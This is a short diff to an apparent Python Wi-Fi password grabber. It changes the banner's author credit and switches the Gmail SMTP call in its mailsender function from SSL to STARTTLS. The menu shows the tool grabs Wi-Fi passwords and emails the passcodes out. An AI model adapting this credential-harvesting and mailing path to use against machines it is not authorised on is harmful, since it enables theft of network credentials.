@@ -51,9 +51,7 @@ def heading():
   `:Nmmmmmmmmmmmmmmmmmmmmmm;`  ``   ``   ``  ```  ```  ``   ``   ``  ```  ```  ```  ``   ``  ```   `
 `` .Nmmmmmmmmmmmmmmmmmmmmm; ``   ``  ```  ``   ``   ``  ```  ``   ``   ``   ``   ``  ```  ``   ``` 
 
-                      by:''' + WHITE + ' MrAnonymousOfficial (' + YELLOW + '@mr.anonymous_official' + WHITE + ')\n\t\t\t'
-                                        'Instagram (' + YELLOW + 'instagram.com/mr.anonymous_official' +WHITE+ ')\n\t\t\t'    
-                                        'Twitter   (' + YELLOW + 'twitter.com/MrAnonymousOfcl' +WHITE+ ')' + '\n''' + END) 
+                      by:''' + WHITE + ' Karthik Raja (' + YELLOW + 'github.com/karthikraja001' + WHITE + ')\n\t\t\t'+ '\n''' + END) 
     print ('\n\t\t {0}[{1}M{0}]{1} Send Passcodes to E-Mail   {0}[{1}G{0}]{1} Grab Wi-Fi Password\n\t\t {0}[{1}H{0}]{1} Help\t\t\t{0}[{1}Q{0}]{1} Quit   '.format(YELLOW, WHITE) + '\n')
  
 
@@ -103,7 +101,8 @@ def mailsender():
     text = message.as_string()
 
     context = ssl.create_default_context()
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.starttls(context=context)
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, text)
 
